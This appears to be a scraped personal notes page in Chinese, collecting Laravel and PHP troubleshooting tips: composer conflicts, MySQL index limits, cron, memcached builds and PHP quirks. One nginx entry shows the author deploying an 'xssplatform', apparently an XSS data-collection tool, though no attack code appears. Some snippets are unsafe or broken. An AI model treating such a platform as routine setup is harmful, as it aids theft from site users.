/etc/supervisord.conf[root@localhost supervisor]# supervisorctl statusartisan_queue BACKOFF Exited too quickly (process log may have details)http://blog.51cto.com/jxlwc/2112062 https://www.jianshu.com/p/3658c963d28b Specified key was too long123456789101112https://laravel-china.org/articles/17094/larave-admin-installation?#reply64528默认的数据库字符集，现在utf8mb4包括存储emojis支持。如果你运行MySQL v5.7.7或者更高版本，则不需要做任何事情。https://laravel-china.org/articles/4195/laravel-54-common-error-specified-key-was-too-longhttps://segmentfault.com/a/1190000008416200把config下的database.php下的mysql设置中,将'strict' =&gt; false就行了..Schema::defaultStringLength(191); 是设置好的默认的字符串长度，也就是说，迁移中的字段没有设置长度的话，varchar 字段会被默认成长度只有 191use Illuminate\Support\Facades\Schema;public function boot()&#123; Schema::defaultStringLength(191);&#125; laravel with 查询中只查询个别字段12345678select 的时候没有 id 的话就会为 null https://laravel-china.org/articles/17379public function brand() &#123; return $this-&gt;belongsTo(Brand::class, 'brandId')-&gt;select('id', 'briefCode'); &#125; $result = Brand::with(['brand' =&gt; function($query)&#123; $query-&gt;select('id', 'briefCode');&#125;])-&gt;get(); PHP输出A到Z123456789101112131415161718for($i='A'; $i&lt;='Z'; $i++)&#123; echo $i . '&lt;br&gt;';&#125;for($i=ord('A'); $i&lt;=ord('Z'); $i++)&#123; echo chr($i) . '&lt;br&gt;';&#125;for($i = 'A'; $i != 'BB'; $i++)&#123; echo $i . '&lt;br&gt;';&#125;$al = 'A';while($al != 'BB')&#123; echo $al++ . '&lt;br&gt;';&#125; env函数的小坑12345678dump(env('APP_ENV') === null); // true 因为没有执行 config:cache 命令，而项目上线后为了优化访问速度，生成了缓存文件，导致env取值失败如果使用了config:cache，env函数只能在config目录下的配置文件的php里使用，不可以在其他地方使用。一个非常简单的办法就是将env('APP_ENV')改为config('app.env')config函数会优先读取 bootstrap/cache/config.php 中缓存的配置，如果没有缓存文件，则会直接读取 config 目录下的所有配置文件https://www.jianshu.com/p/83f9cd407751 任务调度的列表12345//1. 加载Console内核app()-&gt;make(\Illuminate\Contracts\Console\Kernel::class);//2. 获取计划任务列表$scheduleList = app()-&gt;make(\Illuminate\Console\Scheduling\Schedule::class)-&gt;events(); 在模型事件中获取某字段修改前的值12345678Issue::saving(function(Issue $issue)&#123; if ($issue-&gt;isDirty('title')) &#123; $user = Auth::user()-&gt;username; $oldTitle = $issue-&gt;getOriginal('title'); // 原始值https://laravel-china.org/wikis/16169 $newTitle = $issue-&gt;title; // 新值 ActionLog::log("$user 把标题 $oldTitle 修改为 $newTitle"); &#125;&#125;); laravel SerializesModels因为我们在任务类里引用了 SerializesModels 这个 trait，使得 Eloquent 模型在处理任务时可以被优雅地序列化和反序列化。如果你的队列任务类在构造器中接收了一个 Eloquent 模型，那么只有可识别出该模型的属性会被序列化到队列里。当任务被实际运行时，队列系统便会自动从数据库中重新取回完整的模型。这整个过程对你的应用程序来说是完全透明的，这样可以避免在序列化完整的 Eloquent 模式实例时所带来的一些问题。https://laravel-china.org/topics/2993/laravel-novice-stepped-on-the-pit-to-share composer require失败123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123cat composer.json"monolog/monolog": "^2.0@dev",$ composer require dees040/laravel-api-responses 1/1: https://packagist.laravel-china.org/p/provider-latest$0449728151603 e355a0ee137fb34881e699652e41e3e1de11ba9c4ea7a47a312.json Finished: success: 1, skipped: 0, failure: 0, total: 1Using version dev-master for dees040/laravel-api-responses./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev)Your requirements could not be resolved to an installable set of packages. Problem 1 - The requested package monolog/monolog (locked at 1.23.0, required as ^2.0@dev ) is satisfiable by monolog/monolog[1.23.0] but these conflict with your requiremen ts or minimum-stability. Problem 2 - laravel/framework v5.5.42 requires monolog/monolog ~1.12 -&gt; satisfiable by mo nolog/monolog[1.x-dev]. - laravel/framework v5.5.42 requires monolog/monolog ~1.12 -&gt; satisfiable by mo nolog/monolog[1.x-dev]. - laravel/framework v5.5.42 requires monolog/monolog ~1.12 -&gt; satisfiable by mo nolog/monolog[1.x-dev]. - Can only install one of: monolog/monolog[2.x-dev, 1.x-dev]. - Installation request for monolog/monolog ^2.0@dev -&gt; satisfiable by monolog/m onolog[2.x-dev]. - Installation request for laravel/framework (locked at v5.5.42, required as 5. 5.*) -&gt; satisfiable by laravel/framework[v5.5.42]. $composer require "monolog/monolog:~1.12" 1/1: https://packagist.laravel-china.org/p/provider-latest$d12a81f48a3e1dad512c1d2c375298e3a8ea414dff5000d5f345939429c6b29b.json Finished: success: 1, skipped: 0, failure: 0, total: 1./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev) 1/1: https://dl.laravel-china.org/monolog/monolog/c465e1144536862e03f519cb3d65e924062cabfb.zip Finished: success: 1, skipped: 0, failure: 0, total: 1Package operations: 0 installs, 1 update, 0 removals - Removing monolog/monolog (1.23.0) - Installing monolog/monolog (1.x-dev c465e11):Cloning c465e11445 from cachePackage phpoffice/phpexcel is abandoned, you should avoid using it. Use phpoffice/phpspreadsheet instead.Writing lock fileGenerating optimized autoload files&gt; Illuminate\Foundation\ComposerScripts::postAutoloadDump&gt; @php artisan package:discoverDiscovered Package: 96qbhy/hyidDiscovered Package: appstract/laravel-opcacheDiscovered Package: appstract/lush-httpDiscovered Package: barryvdh/laravel-debugbarDiscovered Package: barryvdh/laravel-dompdfDiscovered Package: barryvdh/laravel-ide-helperDiscovered Package: base62/base62Discovered Package: cblink/laravel-excel-zipDiscovered Package: cblink/laravel-ssoDiscovered Package: chumper/zipperDiscovered Package: encore/laravel-adminDiscovered Package: encore/redis-managerDiscovered Package: fideloper/proxyDiscovered Package: foryoufeng/laravel-generatorDiscovered Package: ibrand/laravel-miniprogram-posterDiscovered Package: intervention/imageDiscovered Package: itsgoingd/clockworkDiscovered Package: jacobcyl/ali-oss-storageDiscovered Package: jellybool/flysystem-upyunDiscovered Package: jenssegers/agentDiscovered Package: jenssegers/mongodbDiscovered Package: laravel-admin-ext/helpersDiscovered Package: laravel/tinkerDiscovered Package: latrell/lockDiscovered Package: lubusin/laravel-decomposerDiscovered Package: maatwebsite/excelDiscovered Package: nesbot/carbonDiscovered Package: overtrue/laravel-query-loggerDiscovered Package: overtrue/laravel-socialiteDiscovered Package: prettus/l5-repositoryDiscovered Package: sentry/sentry-laravelDiscovered Package: simplesoftwareio/simple-qrcodeDiscovered Package: spatie/laravel-tailDiscovered Package: tymon/jwt-authDiscovered Package: zgldh/qiniu-laravel-storagePackage manifest generated successfully.$ composer require dees040/laravel-api-responses 1/1: https://packagist.laravel-china.org/p/provider-latest$14d9ca1b35af157c565d6c564cde71c59043d7457135c5a4317471625a1db2e7.json Finished: success: 1, skipped: 0, failure: 0, total: 1Using version dev-master for dees040/laravel-api-responses./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev) 1/1: https://dl.laravel-china.org/dees040/laravel-api-responses/9aec7eb323fc45e17f1dbb9c6e203d240836f91b.zip Finished: success: 1, skipped: 0, failure: 0, total: 1Package operations: 1 install, 0 updates, 0 removals - Installing dees040/laravel-api-responses (dev-master 9aec7eb): Cloning 9aec7eb323 from cachePackage phpoffice/phpexcel is abandoned, you should avoid using it. Use phpoffice/phpspreadsheet instead.Writing lock fileGenerating optimized autoload files&gt; Illuminate\Foundation\ComposerScripts::postAutoloadDump&gt; @php artisan package:discover$ composer require phpoffice/phpspreadsheet 1/2: https://packagist.laravel-china.org/p/provider-latest$8512051929ea08e8189e440a1f5293135717f61525e93d6f4577794143032dd5.json 2/2: https://packagist.laravel-china.org/p/provider-2018-10$4f971ac341cf575b7ed47aa09773abb926ec0c2baad56a0da2c9eed868beb649.json Finished: success: 2, skipped: 0, failure: 0, total: 2Using version dev-master for phpoffice/phpspreadsheet./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev)Your requirements could not be resolved to an installable set of packages. Problem 1 - maatwebsite/excel 3.0.9 requires phpoffice/phpspreadsheet ^1.2 -&gt; satisfiable by phpoffice/phpspreadsheet[1.2.0, 1.2.1, 1.3.0, 1.3.1, 1.4.0, 1.4.1, 1.5.0] but these conflict with your requirements or minimum-stability. - maatwebsite/excel 3.0.9 requires phpoffice/phpspreadsheet ^1.2 -&gt; satisfiable by phpoffice/phpspreadsheet[1.2.0, 1.2.1, 1.3.0, 1.3.1, 1.4.0, 1.4.1, 1.5.0] but these conflict with your requirements or minimum-stability. - maatwebsite/excel 3.0.9 requires phpoffice/phpspreadsheet ^1.2 -&gt; satisfiable by phpoffice/phpspreadsheet[1.2.0, 1.2.1, 1.3.0, 1.3.1, 1.4.0, 1.4.1, 1.5.0] but these conflict with your requirements or minimum-stability. - Installation request for maatwebsite/excel (locked at 3.0.9) -&gt; satisfiable by maatwebsite/excel[3.0.9].Installation failed, reverting ./composer.json to its original content.suping3@BJ-D-212361A MINGW64 /d/code/blog$ composer require "phpoffice/phpspreadsheet:^1.2" 1/3: https://packagist.laravel-china.org/p/provider-2018-10$edb575ac09ff566f26e69fb52521dbd7b5bd90cb0e97c11c04a834f1ba157b0b.json 2/3: https://packagist.laravel-china.org/p/provider-latest$f7aba8aec5290950424531a654a2519842e07f0dcd995755aa8e64e7f622ad17.json 3/3: https://packagist.laravel-china.org/p/provider-2018-07$1f1ac5377ce1027162f91a3db54217c36e38f7ae18744629e6e89c5e6d410c78.json Finished: success: 3, skipped: 0, failure: 0, total: 3./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev) 1/1: https://dl.laravel-china.org/phpoffice/phpspreadsheet/2dfd06c59825914a1a325f2a2ed13634b9d8c411.zip Finished: success: 1, skipped: 0, failure: 0, total: 1 Fatal error: Class ‘PHPUnit_Framework_TestCase’ not found1234567891011https://github.com/dees040/laravel-api-responses/issues/2vi vendor/dees040/laravel-api-responses/tests/ResponseTest.phpclass ResponseTest extends \PHPUnit\Framework\TestCase$ phpunit vendor/dees040/laravel-api-responses/tests/ResponseTest.phpPHPUnit 6.5.3 by Sebastian Bergmann and contributors............... 14 / 14 (100%)Time: 378 ms, Memory: 16.00MB Laravel 的 collection1234567891011121314$collection = new \Illuminate\Database\Eloquent\Collection(['item a', 'item b', 'item c']);$collection = $collection-&gt;unique();执行时候会报错PHP Fatal error: Call to a member function getKey() on string in /Project/nginx/webbpm-dev.ssl.lol/vendor/laravel/framework/src/Illuminate/Database/Eloquent/Collection.php on line 259 [Symfony\Component\Debug\Exception\FatalErrorException] Call to a member function getKey() on string这是因为 Illuminate\Database\Eloquent\Collection 通过调用自身的 getDictionary 方法，使用根据主键去重复的逻辑覆盖了 Illuminate\Support\Collection 的逻辑。以上代码改成https://laravel-china.org/topics/18696$collection = collect(['item a', 'item b', 'item c']);$collection = $collection-&gt;unique(); 使用”mews/captcha:~2.0” 验证码图片不显示问题12345678910111213Symfony\Component\Debug\Exception\FatalThrowableError: Call to undefined function Intervention\Image\Gd\imagettfbbox() in file /usr/share/nginx/html/LaraBBS/vendor/intervention/image/src/Intervention/Image/Gd/Font.php on line 85如果已经开启了gd，请参考下 https://laravel-china.org/articles/18815?#reply69185 FROM php:7.0-fpmRUN apt-get update &amp;&amp; apt-get install -y \libfreetype6-dev \libjpeg62-turbo-dev \libmcrypt-dev \libpng-dev \&amp;&amp; docker-php-ext-install -j$(nproc) iconv mcrypt \&amp;&amp; docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ \&amp;&amp; docker-php-ext-install -j$(nproc) gd 在解析外部变量时的一个问题1234567891011121314151617181920212223242526//https://segmentfault.com/a/1190000017051950&lt;form method="post"&gt; &lt;input type="text" name="id[]" value="1"&gt; &lt;input type="text" name="id[]_text" value="a"&gt; &lt;input type="text" name="id[]" value="2"&gt; &lt;input type="text" name="id[]_text" value="b"&gt; &lt;input type="submit"&gt;&lt;/form&gt;var_export($_POST);array ( 'id' =&gt; array ( 0 =&gt; '1', 1 =&gt; 'a', 2 =&gt; '2', 3 =&gt; 'b', ),)$foo["id"] = 1;$foo["id[]_text"] = 2;var_export($foo);extract($foo);var_export(get_defined_vars()); Laravel with () limit123456789101112131415161718192021222324比如如何取得每篇文章中的前10条评论下面为错误写法：https://laravel-china.org/articles/19932essay::with(['comment' =&gt; function($query) &#123; $query-&gt;take(10)&#125;])public function products()&#123; return $this-&gt;belongsToMany(Hproduct::class,'hproduct_has_type','type_id','product_id');&#125;public function topTenproducts()&#123; return $this-&gt;products()-&gt;with('supplier')-&gt;where('is_sale','=',1)-&gt;limit(4);&#125;public function getProdcutsWithtopTenproducts($col)&#123; $model = $this-&gt;whereIn('id',$col)-&gt;get(); $model-&gt;each(function ($model) &#123; $model-&gt;load('topTenproducts'); &#125;); return $model-&gt;toArray();&#125; laravel 5.5 索引长度超过限制12345678910111213141516laravel5.4中改变了默认的编码类型(utf8 =&gt; utf8mb4), 从而使email字段索引长度超过了的默认限制长度 https://laravel-china.org/articles/18306InnoDB 引擎中：uft8 varchar 最大长度 255utf8mb4 varchar 最大长度 191设置一下 varchar 的长度不超过 191 即可 table-&gt;string('email')-&gt;index(); varchar会使用utf8mb4编码, utf8mb4编码(4bytes)属于utf8编码(3bytes)的扩展类型,由此可以计算索引长度为255*4+2=1022 &gt;767$ php artisan migrateMigration table created successfully.In Connection.php line 664: SQLSTATE[42000]: Syntax error or access violation: 1071 Specified key was t oo long; max key length is 1000 bytes (SQL: alter table `users` add unique `users_email_unique`(`email`)) cron不执行123456789101112131415坑1：环境变量https://laravel-china.org/articles/18697当Cron无法生效时，可能是Cron执行环境变量不正确引起的PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/opt/mysql/bin:/opt/php7/bin:/opt/memcached/bin:/root/bin* * * * * php /path-to-your-project/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1坑2：Cron 执行用户导致 Laravel log 不可写通过 crontab -e 命令创建的 Cron 是属于 root 用户，如果定时任务在实行时主动写入日志或者遇到异常未捕捉，会创建 root 权限的日志文件，最终会导致 php-fpm 的 www 账号无法写入。因此需要在创建 cron 的时候指定用户crontab -u www -e坑3：cron 内容最后一行未回车解决上述两点问题后，如果仍然发现 cron 不执行，请确认* * * * * php /path-to-your-project/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1 composer update后输出Killed123456//https://laravel-china.org/articles/20443解决方法：在本地环境运行composer update上传新的composer.lock文件到服务器服务器上运行composer install这样就解决的依赖包更新的问题。 Memcached::get(): could not unserialize value, no igbinary support123456789101112131415161718192021222324252627./configure --enable-memcached --enable-memcached-igbinary --with-php-config=/usr/local/bin/php-config但是很不幸，并没有如期待的那样编译成功，遇到如下错误:http://www.helpergarden.com/2017/11/php-memcached%E6%89%A9%E5%B1%95%E5%AE%89%E8%A3%85.html"./php_memcached.h:23:10: fatal error: 'Zend/zend_smart_str.h' file not found#include "Zend/zend_smart_str.h""``` ### cURL version 7.10.5 or later is required to compile php with cURL support```javascript#./configure --with-php-config=/usr/local/php/bin/php-configconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.checking for gawk... gawkchecking for cURL support... yes, sharedchecking for pkg-config... /usr/bin/pkg-configchecking for libcurl.pc... using default pathchecking for cURL 7.10.5 or greater... configure: error: cURL version 7.10.5 or later is required to compile php with cURL supportcurl: try 'curl --help' or 'curl --manual' for more information[root@VM_0_14_centos curl]# yum install curl-develLoaded plugins: fastestmirror, langpacksRepository epel is listed more than once in the configurationcarlwgeorge-ripgrep | 3.0 kB 00:00:00docker-ce-stable#./configure --with-php-config=/usr/local/php/bin/php-config#make &amp;&amp; make installhttps://www.oschina.net/question/81181_19353?sort=default&amp;p=2 nginx 配置问题-FastCGI sent in stderr: “Primary script unknown”12345678910111213141516171819202122232425262728293031323334353637383940一个关于 nginx 配置的问题，配置一个 php 网站，页面总是输出 File not found.，查看 nginx log 中报错：tail -f /var/log/nginx/error.logFastCGI sent in stderr: "Primary script unknown" while reading response header from upstream[root@VM_0_14_centos ~]# cat /etc/nginx/conf.d/xss.confserver &#123; listen 9696 default_server; server_name _; root /root/xssplatform/; #root /usr/share/nginx/html/xssplatform/; rewrite "^/([0-9a-zA-Z]&#123;6&#125;)$" /index.php?do=code&amp;urlKey=$1 last; rewrite "^/do/auth/(\w+?)(/domain/([\w\.]+?))?$" /index.php?do=do&amp;auth=$1&amp;domain=$3 last; rewrite "^/register/(.*?)$" /index.php?do=register&amp;key=$1 last; rewrite "^/register-validate/(.*?)$" /index.php?do=register&amp;act=validate&amp;key=$1 last; location / &#123; index index.html index.htm index.php; &#125; location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9005; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125;fpm 用nobody用户运行 /root/xssplatform/ 权限也是nobody [root@VM_0_14_centos ~]# lsof -i:9005COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEphp-fpm 13691 root 7u IPv4 30712498 0t0 TCP VM_0_14_centos:9005 (LISTEN)php-fpm 13692 nobody 0u IPv4 30712498 0t0 TCP VM_0_14_centos:9005 (LISTEN)php-fpm 13693 nobody 0u IPv4 30712498 0t0 TCP VM_0_14_centos:9005 (LISTEN)https://www.v2ex.com/t/3414411.给我看下你 php-fpm 的配置2.请确定 /var/run/php/php5.6-fpm.sock 这个在 php-fpm 配置正确3.注意 php 和 nginx 执行权限整个root目录树的权限都打开才可以mv /root/xssplatform/ /usr/share/nginx/html/ 就好了 intervention/iamge下载图片过慢123456789101112131415161718192021// 记录开始时间$startTimestamp = microtime(true);$url = 'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0';$avatar = \Image::make($url);// 记录结束时间https://segmentfault.com/a/1190000011989802$endTimestamp = microtime(true);$startTimestamp = microtime(true);$client = new \GuzzleHttp\Client();$url = 'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0';$avatarResponse = $client-&gt;get($url);$avatar = \Image::make($avatarResponse-&gt;getBody()-&gt;getContents());$endTimestamp = microtime(true);三次平均耗时在 0.07 秒左右，和前面的 16 秒相比，差了 200 多倍 MySQL由一个双引号引发的血案12345678910111213141516171819202122232425262728293031//https://mp.weixin.qq.com/s/TJsBPK-RbmvIS0PNJ8GqtQmysql [localhost] &#123;msandbox&#125; (test) &gt; select id,str_col from tbl_name where str_col="xxx" = "yyy";+----+---------+| id | str_col |+----+---------+| 1 | aaa || 2 | aaa || 3 | aaa || 4 | aaa |+----+---------+mysql [localhost] &#123;msandbox&#125; (test) &gt; warningsShow warnings enabled.mysql [localhost] &#123;msandbox&#125; (test) &gt; explain extended select id,str_col from tbl_name where str_col="xxx" = "yyy"\G*************************** 1. row *************************** id: 1 select_type: SIMPLE table: tbl_name type: indexpossible_keys: NULL key: idx_str key_len: 33 ref: NULL rows: 4 filtered: 100.00 Extra: Using where; Using index1 row in set, 1 warning (0.00 sec)Note (Code 1003): /* select#1 */ select `test`.`tbl_name`.`id` AS `id`,`test`.`tbl_name`.`str_col` AS `str_col` from `test`.`tbl_name` where ((`test`.`tbl_name`.`str_col` = 'xxx') = 'yyy')他把where条件转化成了 http://www.fordba.com/mysql-double-quotation-marks-accident.html ((`test`.`tbl_name`.`str_col` = 'xxx') = 'yyy') foreach1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162$arr = [1, 2, 3, 4];foreach($arr as &amp;$value) &#123; $value = $value * 2;&#125;// $arr is now [2, 4, 6, 8]unset($value); // 最后取消掉引用$value的引用仅在被遍历的数组可以被引用时才可用/* 此段代码可以运行 运行结果: 1-2 2-4 3-6 4-8*/foreach (array(1, 2, 3, 4) as &amp;$value) &#123; echo $value, '-'; $value = $value * 2; echo $value, PHP_EOL;&#125;foreach按照值进行循环的时候(by-value), foreach是对该数组的一个拷贝进行操作. 所以在循环过程中修改不影响循环结果$arr = [0, 1, 2];$ref = &amp;$arr;foreach ($arr as $val) &#123; var_dump($val); unset($arr[1]);&#125;$arr = [1, 2, 3];foreach ($arr as $k =&gt; &amp;$v) &#123; $v = $v * 2;&#125;foreach ($arr as $k =&gt; $v) &#123; echo $v, PHP_EOL;&#125;/*输出: 2 4 4*/$arr = [1, 2, 3];foreach ($arr as $k =&gt; &amp;$v) &#123; $v = $v * 2;&#125;unset($v);//数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留。建议使用 unset() 来将其销毁。foreach ($arr as $k =&gt; $v) &#123; echo $v, PHP_EOL;&#125;/*输出: 2 4 6*/ proc_open()打开两个进程1234567891011121314151617181920212223242526272829303132333435//https://blog.jiaojie.site/_posts/2017/08/15/proc_open-and-bash/$descriptorspec = array( 0 =&gt; array("pipe", "r"), // stdin is a pipe that the child will read from 1 =&gt; array("pipe", "w"), // stdout is a pipe that the child will write to 2 =&gt; array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to);$cwd = '/tmp';$env = array('some_option' =&gt; 'aeiou');$process = proc_open('sleep 100', $descriptorspec, $pipes, $cwd, $env);if (is_resource($process)) &#123; // $pipes now looks like this: // 0 =&gt; writeable handle connected to child stdin // 1 =&gt; readable handle connected to child stdout // Any error output will be appended to /tmp/error-output.txt fwrite($pipes[0], '&lt;?php print_r($_ENV); ?&gt;'); fclose($pipes[0]); echo stream_get_contents($pipes[1]); fclose($pipes[1]); // It is important that you close any pipes before calling // proc_close in order to avoid a deadlock $return_value = proc_close($process); echo "command returned $return_value\n";&#125;执行php sleep.php父进程下面竟然出现了两个进程PHP的proc_open系列函数在Linux操作系统中应该是通过系统默认的sh -c命令进行执行的，要把不同的sh带来的结果考虑进去将sh的软链接改到bash上面，PHP代码按照预期的结果执行下去了[root@VM_0_14_centos incubator-superset]# ll /bin/shlrwxrwxrwx 1 root root 4 Mar 19 2018 /bin/sh -&gt; bash MySQL大数据分页123456789101112https://blog.jiaojie.site/_posts/2017/12/22/mysql-pagination-tips/SELECT * FROM test where status = 1 limit start, 1000select * from test a , (select id from test where status = 1 limit 300000, 10) b where a.id = b.id;select * from test inner join (select id from test limit 300000, 10) t2 using (id);select * from test where status = 1 and id &gt; xxx order by id asc limit 10 每三位加个逗号分割12345678910111213$input = "12345678";$regex = "#^(?&lt;first&gt;([0-9]&#123;1,3&#125;)??)(?&lt;others&gt;([0-9]&#123;3&#125;)*)$#";$callback = function($match) &#123; $arr = str_split($match["others"], 3); return empty($match["first"]) ? (implode(",", $arr)) : ("" . $match["first"] . "," . implode(",", $arr));&#125;;$output = preg_replace_callback($regex, $callback, $input);var_dump($output);//"12,345,678" use &amp; Referance1234567891011121314151617181920212223242526272829303132333435use中传递php基本数据类型时，绝大多数情况都是传递的copy。这个大多数情况包括boolean/integer/float/string和array这样的类型。针对object的类型，传递的是引用，不需要加&amp;符号。$fib = function($n)use(&amp;$fib)&#123; if($n == 0 || $n == 1) return 1; return $fib($n - 1) + $fib($n - 2);&#125;;echo $fib(10);//89$aaa = 111;$func = function() use($aaa)&#123; print $aaa; &#125;;$aaa = 222;$func(); // Outputs "111"$aaa = 111;$func = function() use(&amp;$aaa)&#123; print $aaa; &#125;;$aaa = 222;$func(); // Outputs "222"class Foo&#123; public $foo = 'default';&#125;$foo = new Foo;$func = function() use ($foo) &#123; echo $foo-&gt;foo . "\n";&#125;;$foo-&gt;foo = 'changable';$func();// 输出 "changable" 判断 Eloqument 模型查询数据结果是否为空1234567891011return DB::table('orders')-&gt;where('finalized', 1)-&gt;exists();return DB::table('orders')-&gt;where('finalized', 1)-&gt;doesntExist();return Users::where('email','xxx@qq.com')-&gt;exists();return Users::where('email','xxx@qq.com')-&gt;doesntExist();$users = User::where('active', 1)-&gt;all();return $users-&gt;isEmpty();return $users-&gt;isNotEmpty(); requires ext-pcntl123456789101112laravel/horizon v1.4.3 requires ext-pcntl * -&gt; the requested PHP extension pcntl is missing from your system在composer.json中增加"config": &#123; "preferred-install": "dist", "sort-packages": true, "optimize-autoloader": true, "platform": &#123; "ext-pcntl": "7.2", "ext-posix": "7.2" &#125; &#125;, exec函数被禁12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758为了保证数据的有序性，需要对同时消费的进程进行数量限制（同时消费队列的进程不得超过1个） public function index() &#123; $pid = getmypid(); $pidFile = self::PID_FILE; if (file_exists($pidFile)) &#123; $pid = file_get_contents($pidFile); $output = shell_exec("ps aux | grep -v grep | grep &#123;$pid&#125; | grep php | grep index_prod | grep balabala"); if (!empty($output)) &#123; exit(0); &#125; &#125; file_put_contents($pidFile, $pid); for ($i = 0; $i &lt; 100000; $i++) &#123; // bla bla &#125; unlink($pidFile); &#125; public function index() &#123; if ($this-&gt;redis-&gt;exists(self::PID_KEY)) &#123; retry_loop:$pid = $this-&gt;redis-&gt;get(self::PID_KEY); $output = shell_exec("ps aux | grep -v grep | grep &#123;$pid&#125; | grep php | grep index_prod | grep AsyncBatchMemberImport"); if (!empty($output)) &#123; exit(0); &#125; else &#123; $this-&gt;redis-&gt;del(self::PID_KEY); &#125; &#125; $ret = $this-&gt;redis-&gt;set(self::PID_KEY, getmypid(), array('nx')); if (false === $ret) &#123; goto retry_loop; &#125; for ($i = 0; $i &lt; 100000; $i++) &#123; // bla bla &#125; $this-&gt;redis-&gt;del(self::PID_KEY); &#125; php script.php `cat /dev/urandom | head -n 10 | md5sum | head -c 10`public function index($uniqueId = 0) &#123; $this-&gt;uniqueId = $uniqueId; if ($this-&gt;redis-&gt;exists(self::PID_KEY)) &#123; $pid = $this-&gt;redis-&gt;get(self::PID_KEY); log_warning('ERP_IMPORT_ASYNC_INFO', "UniqueId &#123;$pid&#125; Still RUNNING"); exit(0); &#125; $ret = $this-&gt;redis-&gt;set(self::PID_KEY, $uniqueId, array('nx')); if (false === $ret) &#123; log_warning('ERP_IMPORT_ASYNC_INFO', "Set PID FAILED, WILL RETRY, Current PID " . $uniqueId); exit(0); &#125; $this-&gt;redis-&gt;expire(self::PID_KEY, 360); for ($i = 0; $i &lt; 1000; $i++) &#123; // bla bla &#125; $this-&gt;redis-&gt;del(self::PID_KEY); &#125; curl 用完千万别忘 close123456789101112//https://laravel-china.org/articles/9172/curl-do-not-forget-close$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HEADER, false);curl_setopt($ch, CURLOPT_POST, true);curl_setopt($ch, CURLOPT_POSTFIELDS, $data);try&#123; $content = curl_exec($ch);&#125; finally&#123; curl_close($ch);&#125; Memcached::get(): could not unserialize value, no igbinary support1234567891011121314151617181920212223242526272829303132333435363738394041424344454647https://stackoverflow.com/questions/35200566/warning-memcachedgetmulti-could-not-unserialize-value-no-igbinary-support[root@localhost igbinary-2.0.8]# php7 -i|grep igbinaryigbinary support =&gt; noPWD =&gt; /data1/projects/suping/igbinary-2.0.8 php -i | grep igbinaryigbinaryigbinary support =&gt; enabledigbinary version =&gt; 2.0.1igbinary APC serializer ABI =&gt; 0igbinary session support =&gt; yesigbinary.compact_strings =&gt; On =&gt; Onigbinary support =&gt; yesmemcached.serializer =&gt; igbinary =&gt; igbinaryAvailable serializers =&gt; php, igbinaryRegistered serializer handlers =&gt; php php_binary igbinary #wget http://pecl.php.net/get/igbinary-2.0.8.tgz--2018-12-29 19:58:07-- http://pecl.php.net/get/igbinary-2.0.8.tgzResolving pecl.php.net... 104.236.228.160Connecting to pecl.php.net|104.236.228.160|:80... connected.HTTP request sent, awaiting response... 302 FoundLocation: http://120.52.51.17/pecl.php.net/get/igbinary-2.0.8.tgz [following]--2018-12-29 19:58:08-- http://120.52.51.17/pecl.php.net/get/igbinary-2.0.8.tgzConnecting to 120.52.51.17:80... connected.HTTP request sent, awaiting response... 200 OKLength: 76708 (75K) [application/octet-stream]Saving to: “igbinary-2.0.8.tgz”100%[================================================================================&gt;] 76,708 1.75K/s in 55s2018-12-29 19:59:12 (1.35 KB/s) - “igbinary-2.0.8.tgz” saved [76708/76708]#tar -zxvf igbinary-2.0.8.tgz# cd igbinary-2.0.8# /data0/opt/php7/bin/phpizeConfiguring for:PHP Api Version: 20151012Zend Module Api No: 20151012Zend Extension Api No: 320151012# ./configure --with-php-config=/data/php7/bin/php-config#make &amp;&amp; make installBuild complete.Don't forget to run 'make test'.Installing shared extensions: /data0/opt/php7/lib/php/extensions/no-debug-zts-20151012/Installing header files: /data0/opt/php7/include/php/ PHP 读取 ZIP乱码1234567891011121314151617181920212223242526272829303132333435363738394041424344//https://laravel-china.org/topics/21866/** * 获取ZIP压缩文件内容列表 * @param [string] $file ZIP文件路径 * @param [string] $dir 需要列出的文件夹 * @param [bool] $subdir 是否列出子文件夹内容 * @param [callable] $callback 列出每一项时的回调函数 * @return [Array] */function zip_list_content($file, $dir=null, $subdir=true, $callback=null) &#123; $zip = new ZipArchive(); if (!$zip-&gt;open($file)) &#123; return false; &#125; $count = $zip-&gt;numFiles; if ($dir) $dir = trim($dir, '/'); if (is_callable($callback) $_callback = true; else $_callback = false; $results = []; for ($i = 0; $i &lt; $count; $i++) &#123; $entry = $zip-&gt;statIndex($i, ZipArchive::FL_ENC_RAW); $entry['name'] = rtrim(str_replace('\\', '/', $entry['name']), '/'); $encoding = mb_detect_encoding($entry['name'], array('Shift_JIS','EUC_JP','EUC_KR','KOI8-R','ASCII','GB2312','GBK','BIG5','UTF-8')); $filename = iconv($encoding, 